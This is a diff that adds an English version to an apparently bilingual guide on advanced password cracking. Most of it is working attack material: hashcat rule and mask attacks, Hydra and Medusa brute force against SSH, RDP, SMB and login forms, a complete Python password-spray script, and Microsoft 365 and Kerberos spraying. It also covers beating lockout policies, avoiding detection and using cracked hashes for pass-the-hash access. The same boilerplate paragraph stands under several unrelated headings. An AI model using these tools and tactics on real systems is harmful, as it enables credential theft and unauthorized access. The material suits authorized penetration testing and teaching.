@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 03 Advanced Cracking Techniques
 
 ## 레인보우 테이블
@@ -880,6 +886,893 @@ impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c \
   administrator@192.168.1.10
 
 # 크래킹된 패스워드로 직접 접근
+evil-winrm -i 192.168.1.10 -u administrator -p 'Password123'
+impacket-smbclient domain/administrator:Password123@192.168.1.10
+```
+
+---
+
+<a name="english"></a>
+
+# 03 Advanced Cracking Techniques
+
+## Rainbow Tables
+
+### Principles
+
+Rainbow tables are a precomputed structure for reversing hash values back to plaintext.  
+They are stored in chain units, dramatically reducing space compared to a pure hash dictionary.
+
+```
+Plaintext → [Hash Function] → Hash → [Reduction Function R] → Plaintext' → [Hash Function] → Hash' → ...
+startpoint                                                                                    endpoint
+```
+
+- Storage: Only `(startpoint, endpoint)` pairs are stored
+- Cracking: Repeatedly apply the reduction function to the target hash → match chain endpoints → regenerate the chain to recover the plaintext
+- Salt invalidates the table → bcrypt/SHA512crypt etc. are inefficient against rainbow tables
+
+### rtgen — Rainbow Table Generation
+
+```bash
+# Installation
+sudo apt install rainbowcrack
+# Or
+git clone https://github.com/inAudible-NG/RainbowCrack-NG
+
+# Basic usage
+# rtgen <hash_algorithm> <charset> <min_len> <max_len> <table_idx> <chain_len> <chain_num> <part_idx>
+
+# MD5, lowercase+digits, length 1~6, chain length 3800, chain count 33554432
+rtgen md5 loweralpha-numeric 1 6 0 3800 33554432 0
+
+# NTLM, lowercase, length 1~7
+rtgen ntlm loweralpha 1 7 0 3800 33554432 0
+
+# Sort tables (required before searching)
+rtsort *.rt
+
+# Check available character sets
+cat /usr/share/rainbowcrack/charset.txt
+```
+
+### rcrack — Rainbow Table Cracking
+
+Use rcrack with pre-generated rainbow tables to crack hashes. This is a time-memory trade-off approach.
+
+```bash
+# Crack a single hash
+rcrack /path/to/tables/ -h 5f4dcc3b5aa765d61d8327deb882cf99
+
+# Crack hashes from a file
+rcrack /path/to/tables/ -l hashes.txt
+
+# Crack NTLM hash
+rcrack /opt/rainbowtables/ntlm/ -h 8846f7eaee8fb117ad06bdd830b7586c
+
+# GPU-accelerated version (rcracki_mt)
+rcracki_mt -h 5f4dcc3b... /path/to/tables/*.rt
+```
+
+### Online Rainbow Table Services
+
+Utilize online rainbow table services such as CrackStation and hashes.com. Unsalted hashes like MD5 and SHA-1 can be looked up quickly.
+
+```bash
+# crackstation.net, hashes.com, md5decrypt.net, etc.
+# Automation with curl (example: crackstation API)
+curl -s 'https://crackstation.net/crack.js' \
+  -d "hash=5f4dcc3b5aa765d61d8327deb882cf99&submit=Crack+Hashes"
+```
+
+---
+
+## Rule-Based Mutations
+
+### Leetspeak Mutations
+
+Advanced hashcat cracking techniques. Use rule-based mutations (`-r`) to append digits and special characters to words, or use mask attacks (`-a 3`) for exhaustive pattern searches. Combining multiple GPUs can dramatically increase cracking speed.
+
+```bash
+# Use hashcat's built-in leetspeak rule file
+hashcat -m 0 -a 0 hash.txt wordlist.txt \
+  -r /usr/share/hashcat/rules/leetspeak.rule
+
+# Custom leetspeak rule file
+cat << 'EOF' > leet.rule
+# Basic substitutions
+sa4
+se3
+si1
+so0
+st7
+sl1
+sg9
+# Combined substitutions
+sa4se3
+sa4si1
+so0se3si1
+sa4se3si1so0
+# Leet + capitalize first letter
+sa4 c
+se3 c
+sa4se3 c
+EOF
+
+hashcat -m 0 -a 0 hash.txt wordlist.txt -r leet.rule
+```
+
+### Case Mutations
+
+Write case mutation rules. Using hashcat rule files to automatically generate various case combinations of the same word extends the cracking range.
+
+```bash
+cat << 'EOF' > case_rules.rule
+# All lowercase
+l
+# All uppercase
+u
+# Capitalize first letter
+c
+# Lowercase first letter
+C
+# Toggle (toggle case of 1st character)
+T0
+T1
+T2
+# Alternate case (odd/even toggle)
+TN
+# Title case (capitalize first letter of each word)
+E
+EOF
+
+hashcat -m 0 -a 0 hash.txt wordlist.txt -r case_rules.rule
+```
+
+### Digit Append Mutations
+
+Mutation rules that append digits before and after words. Covers common patterns of adding years or numbers to passwords.
+
+```bash
+cat << 'EOF' > append_rules.rule
+# Append single digit
+$0
+$1
+$2
+$3
+$4
+$5
+$6
+$7
+$8
+$9
+# Append year
+Az"2020"
+Az"2021"
+Az"2022"
+Az"2023"
+Az"2024"
+Az"2025"
+# Append two digits
+$0$0
+$1$1
+$1$2$3
+# Prepend digit
+^1
+^2
+^1^2^3
+# Digits front and back
+^1$1
+^2$2
+# Append special characters
+$!
+$@
+$#
+$$
+$%
+$!$1
+Az"!"
+Az"@"
+Az"123!"
+Az"2024!"
+# Capitalize first letter + append digit
+c $1
+c $2
+c Az"123"
+c Az"2024"
+c Az"2024!"
+EOF
+```
+
+---
+
+## PRINCE Attack
+
+PRINCE (PRobability INfinite Chained Elements) is an advanced form of combination attack.  
+It generates candidates in probability-based order by chaining input elements together.
+
+```bash
+# Install princeprocessor
+git clone https://github.com/hashcat/princeprocessor /opt/prince
+cd /opt/prince/src && make
+cp pp64.bin /usr/local/bin/pp
+
+# Or via package
+sudo apt install hashcat-utils
+
+# Basic usage — generate element combinations
+pp /usr/share/wordlists/rockyou.txt | hashcat -m 0 -a 0 hash.txt --stdin
+
+# Limit minimum/maximum element count
+pp --pw-min=2 --pw-max=3 wordlist.txt | hashcat -m 0 hash.txt --stdin
+
+# Limit minimum/maximum length
+pp --elem-cnt-min=2 --elem-cnt-max=4 \
+   --pw-min=8 --pw-max=16 \
+   wordlist.txt | hashcat -m 0 hash.txt --stdin
+
+# Limit output count
+pp --limit=1000000 wordlist.txt > prince_output.txt
+
+# Include case permutations
+pp --case-permute wordlist.txt | head -20
+
+# Print statistics
+pp --keyspace wordlist.txt
+
+# Direct PRINCE mode in hashcat (-a 9)
+hashcat -m 0 -a 9 hash.txt wordlist.txt
+
+# PRINCE + rules
+hashcat -m 0 -a 9 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+---
+
+## Advanced Mask Attacks
+
+### Using .hcmask Files
+
+Apply multiple masks sequentially using .hcmask files. Define multiple masks with different lengths and character sets in one file for automatic execution.
+
+```bash
+# hcmask file: one line = one mask
+cat << 'EOF' > custom.hcmask
+# Commonly used patterns
+?u?l?l?l?l?d?d?d?d
+?u?l?l?l?l?l?d?d?d
+?u?l?l?l?l?d?d?d?d?s
+?u?l?l?l?l?l?l?d?d
+?u?l?l?l?l?l?l?d?d?s
+?l?l?l?l?d?d?d?d
+?l?l?l?l?l?d?d?d?d
+?l?l?l?l?l?l?d?d?d?d
+?d?d?d?d?d?d?d?d
+?u?l?l?l?l?l?l?l
+EOF
+
+hashcat -m 0 -a 3 hash.txt custom.hcmask
+
+# Use auto-generated hcmask from PACK
+python3 /opt/pack/maskgen.py analysis.txt \
+  --targettime 3600 \
+  --minlength 8 \
+  --maxlength 12 \
+  -o smart.hcmask
+
+hashcat -m 1000 -a 3 ntlm_hashes.txt smart.hcmask
+```
+
+### Custom Character Set Combinations
+
+Advanced hashcat cracking techniques. Use rule-based mutations (`-r`) to append digits and special characters to words, or use mask attacks (`-a 3`) for exhaustive pattern searches. Combining multiple GPUs can dramatically increase cracking speed.
+
+```bash
+# Define up to 4 custom character sets with -1 through -4
+# Uppercase/lowercase + special character set
+hashcat -m 0 -a 3 hash.txt \
+  -1 '!@#$%^&*' \
+  -2 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' \
+  -3 '0123456789' \
+  ?2?2?2?2?2?3?3?1
+
+# Reflect national keyboard layout characteristics
+hashcat -m 0 -a 3 hash.txt \
+  -1 'qwertyuiopasdfghjklzxcvbnm' \
+  ?1?1?1?1?1?1?1?1
+
+# Fix known pattern prefix/suffix
+# "Pass" + 4 digits
+hashcat -m 0 -a 3 hash.txt 'Pass?d?d?d?d'
+
+# "Summer" + year
+hashcat -m 0 -a 3 hash.txt 'Summer?d?d?d?d'
+
+# Gradually increasing length (--increment)
+hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a \
+  --increment --increment-min=6 --increment-max=8
+```
+
+---
+
+## Online Brute Force — Hydra
+
+Perform online brute force attacks against various services using Hydra. Supports over 50 protocols including HTTP, FTP, SSH, and RDP.
+
+```bash
+# Basic syntax
+hydra -l <user> -p <pass> <target> <service>
+hydra -l <user> -P <passlist> <target> <service>
+hydra -L <userlist> -P <passlist> <target> <service>
+
+# SSH brute force
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
+hydra -L users.txt -P passwords.txt 192.168.1.10 ssh -t 4 -V
+
+# FTP
+hydra -l admin -P rockyou.txt ftp://192.168.1.10
+
+# HTTP Basic Auth
+hydra -l admin -P rockyou.txt http-get://192.168.1.10/admin/
+
+# HTTP POST form
+hydra -l admin -P rockyou.txt 192.168.1.10 \
+  http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
+
+# HTTPS
+hydra -l admin -P rockyou.txt 192.168.1.10 \
+  https-post-form "/login:username=^USER^&password=^PASS^:Login failed" -s 443
+
+# RDP
+hydra -l administrator -P rockyou.txt rdp://192.168.1.10
+
+# SMB
+hydra -l administrator -P rockyou.txt smb://192.168.1.10
+
+# SMTP
+hydra -l user@domain.com -P rockyou.txt smtp://mail.domain.com
+
+# MySQL
+hydra -l root -P rockyou.txt mysql://192.168.1.10
+
+# Parallelism settings
+hydra -l admin -P rockyou.txt 192.168.1.10 ssh \
+  -t 4          \   # concurrent connections
+  -w 30         \   # timeout (seconds)
+  -W 2          \   # wait between connections (seconds)
+  -V               # verbose output
+
+# Save results
+hydra -l admin -P rockyou.txt 192.168.1.10 ssh -o found.txt
+
+# Resume (-R)
+hydra -R
+
+# Specify custom port
+hydra -l admin -P rockyou.txt -s 2222 192.168.1.10 ssh
+
+# Attack multiple hosts simultaneously
+hydra -l admin -P rockyou.txt -M hosts.txt ssh
+```
+
+---
+
+## Online Brute Force — Medusa
+
+Medusa is a parallel online login brute force tool. Supports various protocols including FTP, SSH, and HTTP.
+
+```bash
+# Basic syntax
+medusa -h <host> -u <user> -P <passlist> -M <module>
+
+# SSH
+medusa -h 192.168.1.10 -u root -P rockyou.txt -M ssh
+
+# FTP
+medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ftp
+
+# HTTP Basic Auth
+medusa -h 192.168.1.10 -u admin -P rockyou.txt -M http \
+  -m DIR:/admin
+
+# HTTP form
+medusa -h 192.168.1.10 -u admin -P rockyou.txt -M web-form \
+  -m FORM:/login.php \
+  -m FORM-DATA:"post?username=&password=" \
+  -m DENY-SIGNAL:"Login failed"
+
+# SMB
+medusa -h 192.168.1.10 -u administrator -P rockyou.txt -M smbnt
+
+# Parallelism settings
+medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh \
+  -t 4   \   # concurrent threads
+  -T 2   \   # concurrent connections per host
+  -f         # stop on first success
+
+# Multiple hosts
+medusa -H hosts.txt -u admin -P rockyou.txt -M ssh
+
+# Save results
+medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh -O results.txt
+
+# List supported modules
+medusa -d
+```
+
+---
+
+## Python 3.10+ Password Spray Tool
+
+Implement a password spray tool in Python. To avoid account lockouts, attempt only a small number of passwords against multiple accounts with controlled time intervals.
+
+```python
+#!/usr/bin/env python3
+"""
+Password spray tool (HTTP form-based)
+Usage: python3 password_spray.py -u users.txt -p passwords.txt -t https://target.com/login
+"""
+
+import argparse
+import sys
+import time
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from dataclasses import dataclass, field
+from pathlib import Path
+from typing import Optional
+from urllib.parse import urlparse
+
+try:
+    import requests
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+except ImportError:
+    print("[!] requests library required: pip install requests", file=sys.stderr)
+    sys.exit(1)
+
+
+@dataclass
+class SprayConfig:
+    target_url: str
+    userlist: Path
+    passlist: Path
+    user_field: str = "username"
+    pass_field: str = "password"
+    fail_string: str = "Invalid"
+    success_string: str = ""
+    threads: int = 3
+    delay: float = 1.0          # delay between requests (seconds)
+    timeout: int = 10
+    proxy: Optional[str] = None
+    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    extra_fields: dict[str, str] = field(default_factory=dict)
+    output_file: Optional[Path] = None
+    spray_mode: bool = True     # True: 1 password per all users, False: all passwords per 1 user
+
+
+@dataclass
+class Credential:
+    username: str
+    password: str
+    success: bool = False
+    status_code: int = 0
+    response_len: int = 0
+    error: str = ""
+
+
+class RateLimiter:
+    """Thread-safe rate limiter."""
+
+    def __init__(self, delay: float) -> None:
+        self.delay = delay
+        self._lock = threading.Lock()
+        self._last_request = 0.0
+
+    def wait(self) -> None:
+        with self._lock:
+            now = time.monotonic()
+            elapsed = now - self._last_request
+            if elapsed < self.delay:
+                time.sleep(self.delay - elapsed)
+            self._last_request = time.monotonic()
+
+
+def make_session(config: SprayConfig) -> requests.Session:
+    """Create a requests session with retry logic."""
+    session = requests.Session()
+    session.headers["User-Agent"] = config.user_agent
+
+    retry_strategy = Retry(
+        total=3,
+        backoff_factor=1,
+        status_forcelist=[429, 500, 502, 503, 504],
+        allowed_methods=["GET", "POST"],
+    )
+    adapter = HTTPAdapter(max_retries=retry_strategy)
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
+
+    if config.proxy:
+        session.proxies = {"http": config.proxy, "https": config.proxy}
+        session.verify = False  # Bypass TLS verification when using proxy
+
+    return session
+
+
+def attempt_login(
+    config: SprayConfig,
+    username: str,
+    password: str,
+    session: requests.Session,
+    rate_limiter: RateLimiter,
+) -> Credential:
+    """Single login attempt. Returns Credential object."""
+    cred = Credential(username=username, password=password)
+    rate_limiter.wait()
+
+    payload: dict[str, str] = {
+        config.user_field: username,
+        config.pass_field: password,
+        **config.extra_fields,
+    }
+
+    try:
+        resp = session.post(
+            config.target_url,
+            data=payload,
+            timeout=config.timeout,
+            allow_redirects=True,
+        )
+        cred.status_code = resp.status_code
+        cred.response_len = len(resp.content)
+
+        # Success determination logic
+        if config.success_string:
+            cred.success = config.success_string in resp.text
+        else:
+            cred.success = config.fail_string not in resp.text
+
+        # Account lockout detection
+        lockout_indicators = [
+            "account locked", "too many attempts", "locked out",
+            "temporarily disabled", "계정이 잠겼", "잠금",
+        ]
+        for indicator in lockout_indicators:
+            if indicator.lower() in resp.text.lower():
+                cred.error = f"LOCKOUT_DETECTED: {indicator}"
+                cred.success = False
+                break
+
+    except requests.exceptions.ConnectionError as e:
+        cred.error = f"CONNECTION_ERROR: {e}"
+    except requests.exceptions.Timeout:
+        cred.error = "TIMEOUT"
+    except requests.exceptions.TooManyRedirects:
+        cred.error = "TOO_MANY_REDIRECTS"
+    except requests.exceptions.RequestException as e:
+        cred.error = f"REQUEST_ERROR: {e}"
+
+    return cred
+
+
+def load_list(path: Path) -> list[str]:
+    """Load file line by line, removing blank lines and comments."""
+    if not path.exists():
+        print(f"[!] File not found: {path}", file=sys.stderr)
+        sys.exit(1)
+    return [
+        line.strip()
+        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines()
+        if line.strip() and not line.startswith("#")
+    ]
+
+
+def spray_attack(config: SprayConfig) -> list[Credential]:
+    """
+    Spray mode: attempt each password against all users.
+    Add delay per password to prevent account lockouts.
+    """
+    users = load_list(config.userlist)
+    passwords = load_list(config.passlist)
+
+    print(f"[*] Target: {config.target_url}")
+    print(f"[*] Users: {len(users)} | Passwords: {len(passwords)}")
+    print(f"[*] Threads: {config.threads} | Delay: {config.delay}s")
+    print(f"[*] Total attempts: {len(users) * len(passwords):,}\n")
+
+    found: list[Credential] = []
+    rate_limiter = RateLimiter(config.delay)
+
+    # Spray mode: password → user order
+    if config.spray_mode:
+        for i, password in enumerate(passwords, 1):
+            print(f"[*] Password {i}/{len(passwords)}: {password}")
+
+            tasks: list[tuple[str, str]] = [(u, password) for u in users]
+
+            with ThreadPoolExecutor(max_workers=config.threads) as executor:
+                session = make_session(config)
+                futures = {
+                    executor.submit(
+                        attempt_login, config, u, p, session, rate_limiter
+                    ): (u, p)
+                    for u, p in tasks
+                }
+
+                for future in as_completed(futures):
+                    cred = future.result()
+                    if cred.error and "LOCKOUT" in cred.error:
+                        print(f"[!] Account lockout detected: {cred.username} — {cred.error}")
+                        print("[!] Recommend aborting attack")
+                    elif cred.success:
+                        print(f"\n[+] Success! {cred.username}:{cred.password}")
+                        found.append(cred)
+                    else:
+                        pass  # Silently ignore failures
+
+            # Additional delay between passwords (lockout prevention)
+            if i < len(passwords):
+                spray_delay = max(config.delay * 5, 30.0)
+                print(f"[*] Waiting {spray_delay:.0f}s before next password...")
+                time.sleep(spray_delay)
+    else:
+        # Single user + all passwords
+        for user in users:
+            print(f"[*] User: {user}")
+            with ThreadPoolExecutor(max_workers=config.threads) as executor:
+                session = make_session(config)
+                futures = {
+                    executor.submit(
+                        attempt_login, config, user, p, session, rate_limiter
+                    ): p
+                    for p in passwords
+                }
+                for future in as_completed(futures):
+                    cred = future.result()
+                    if cred.success:
+                        print(f"[+] Success! {cred.username}:{cred.password}")
+                        found.append(cred)
+
+    return found
+
+
+def save_results(results: list[Credential], output_path: Path) -> None:
+    lines = [f"{c.username}:{c.password}" for c in results if c.success]
+    output_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
+    print(f"[*] Results saved: {output_path}")
+
+
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(
+        description="HTTP form password spray tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  # Basic spray (1 password per all users)
+  python3 password_spray.py -u users.txt -p passwords.txt \\
+    -t https://target.com/login --fail-str "Login failed"
+
+  # Custom field names
+  python3 password_spray.py -u users.txt -p passwords.txt \\
+    -t https://target.com/login \\
+    --user-field email --pass-field passwd
+
+  # Via proxy (Burp Suite)
+  python3 password_spray.py -u users.txt -p pass.txt \\
+    -t https://target.com/login --proxy http://127.0.0.1:8080
+
+  # Single user full brute force mode
+  python3 password_spray.py -u single_user.txt -p rockyou.txt \\
+    -t https://target.com/login --no-spray -t 8 --delay 0.5
+        """,
+    )
+    parser.add_argument("-u", "--userlist", type=Path, required=True, help="User list file")
+    parser.add_argument("-p", "--passlist", type=Path, required=True, help="Password list file")
+    parser.add_argument("-t", "--target", required=True, help="Login URL")
+    parser.add_argument("--user-field", default="username", help="Username form field (default: username)")
+    parser.add_argument("--pass-field", default="password", help="Password form field (default: password)")
+    parser.add_argument("--fail-str", default="Invalid", help="String present in failed response")
+    parser.add_argument("--success-str", default="", help="String present in successful response")
+    parser.add_argument("--threads", type=int, default=3, help="Thread count (default: 3)")
+    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests in seconds (default: 1.0)")
+    parser.add_argument("--timeout", type=int, default=10, help="Timeout in seconds")
+    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
+    parser.add_argument("--no-spray", action="store_true", help="Disable spray mode (all passwords per user)")
+    parser.add_argument("-o", "--output", type=Path, help="Output file for results")
+    parser.add_argument("--extra-field", action="append", metavar="KEY=VALUE",
+                        help="Additional form fields (e.g., --extra-field csrf_token=abc123)")
+    return parser.parse_args()
+
+
+def main() -> None:
+    args = parse_args()
+
+    # Parse extra form fields
+    extra_fields: dict[str, str] = {}
+    if args.extra_field:
+        for item in args.extra_field:
+            try:
+                k, v = item.split("=", 1)
+                extra_fields[k] = v
+            except ValueError:
+                print(f"[!] Invalid --extra-field format: {item}", file=sys.stderr)
+
+    config = SprayConfig(
+        target_url=args.target,
+        userlist=args.userlist,
+        passlist=args.passlist,
+        user_field=args.user_field,
+        pass_field=args.pass_field,
+        fail_string=args.fail_str,
+        success_string=args.success_str,
+        threads=args.threads,
+        delay=args.delay,
+        timeout=args.timeout,
+        proxy=args.proxy,
+        extra_fields=extra_fields,
+        output_file=args.output,
+        spray_mode=not args.no_spray,
+    )
+
+    # URL validation
+    parsed = urlparse(config.target_url)
+    if not parsed.scheme or not parsed.netloc:
+        print(f"[!] Invalid URL: {config.target_url}", file=sys.stderr)
+        sys.exit(1)
+
+    try:
+        results = spray_attack(config)
+    except KeyboardInterrupt:
+        print("\n[!] User interrupted")
+        sys.exit(0)
+
+    print(f"\n[*] Done — Successful: {len(results)}")
+    for cred in results:
+        print(f"    {cred.username}:{cred.password}")
+
+    if args.output and results:
+        save_results(results, args.output)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## Practical Command Reference
+
+### CrackMapExec Password Spray (SMB/WinRM)
+
+Perform password spray attacks against SMB/WinRM protocols using CrackMapExec. Effective for finding valid credentials in domain environments.
+
+```bash
+# SMB spray
+crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt \
+  --continue-on-success
+
+# Single password across entire domain
+crackmapexec smb 192.168.1.10 -u users.txt -p 'Password2024!' \
+  --continue-on-success
+
+# WinRM
+crackmapexec winrm 192.168.1.10 -u users.txt -p passwords.txt
+
+# LDAP (AD)
+crackmapexec ldap 192.168.1.10 -u users.txt -p 'Password2024!'
+
+# Successful logins shown with [+]
+# Locked accounts show STATUS_ACCOUNT_LOCKED_OUT
+```
+
+### Kerbrute — Kerberos-Based Spray (Lower Lockout Risk)
+
+Perform Kerberos-based user enumeration and password spraying with Kerbrute. Uses Kerberos error codes instead of Event Log 4625 to reduce detection.
+
+```bash
+# Installation
+wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
+chmod +x kerbrute_linux_amd64 && mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
+
+# User enumeration
+kerbrute userenum --dc 192.168.1.10 -d domain.local users.txt
+
+# Password spray
+kerbrute passwordspray --dc 192.168.1.10 -d domain.local users.txt 'Password2024!'
+
+# Single user brute force
+kerbrute bruteuser --dc 192.168.1.10 -d domain.local passwords.txt jdoe
+
+# Save results
+kerbrute passwordspray --dc 192.168.1.10 -d domain.local \
+  users.txt 'Password2024!' -o results.txt
+```
+
+### Spray365 (Microsoft 365)
+
+Spray365 performs password spraying against Microsoft 365 environments. Automatically adjusts time intervals and IPs to bypass smart lockout.
+
+```bash
+# Installation
+pip install spray365
+
+# M365 spray
+spray365 spray -e emails.txt -p passwords.txt \
+  --delay 1800    # 30-minute delay (prevent account lockout)
+
+# Consider smart lockout policy: typically 10 attempts/10 min → recommend 1 password/hour
+```
+
+### o365spray
+
+Perform Microsoft 365 account enumeration and password spraying with o365spray. Minimizes account lockouts by leveraging multiple endpoints.
+
+```bash
+git clone https://github.com/0xZDH/o365spray /opt/o365spray
+
+# Domain validation
+python3 /opt/o365spray/o365spray.py --validate --domain target.com
+
+# User enumeration
+python3 /opt/o365spray/o365spray.py --enum -U users.txt --domain target.com
+
+# Password spray
+python3 /opt/o365spray/o365spray.py --spray \
+  -U valid_users.txt \
+  -P passwords.txt \
+  --domain target.com \
+  --sleep 60 \      # 60 seconds between requests
+  --count 1         # 1 password at a time
+```
+
+---
+
+## Account Lockout Policy Bypass Strategies
+
+Check the domain's account lockout policy. Identify the lockout threshold, observation window, and lockout duration to determine the maximum number of attempts for undetected spraying.
+
+```bash
+# 1. Check lockout threshold (AD environment)
+crackmapexec smb 192.168.1.10 -u user -p pass --pass-pol
+
+# net command (Windows)
+net accounts /domain
+
+# 2. Attempt fewer times than the lockout threshold
+# Example: lockout at 5 → attempt only 4 times per password
+
+# 3. Wait for lockout reset time
+# Usually 30 min to 1 hour → wait longer
+
+# 4. Attack during off-hours (late night, etc.)
+
+# 5. Kerberos pre-authentication failures may not count toward lockout
+# → Use Kerbrute
+
+# 6. Spray mode: 1 password × all users (same password across multiple users)
+# Minimizes the rate at which individual user lockout counters increase
+```
+
+---
+
+## Using Cracking Results
+
+Advanced hashcat cracking techniques. Use rule-based mutations (`-r`) to append digits and special characters to words, or use mask attacks (`-a 3`) for exhaustive pattern searches. Combining multiple GPUs can dramatically increase cracking speed.
+
+```bash
+# Extract results from hashcat pot file
+hashcat -m 1000 --show ntlm_hashes.txt
+cat ~/.hashcat/hashcat.potfile | grep -f ntlm_hashes.txt
+
+# john pot file
+cat ~/.john/john.pot
+
+# Pass-the-Hash with cracked passwords
+impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c \
+  administrator@192.168.1.10
+
+# Direct access with cracked passwords
 evil-winrm -i 192.168.1.10 -u administrator -p 'Password123'
 impacket-smbclient domain/administrator:Password123@192.168.1.10
 ```
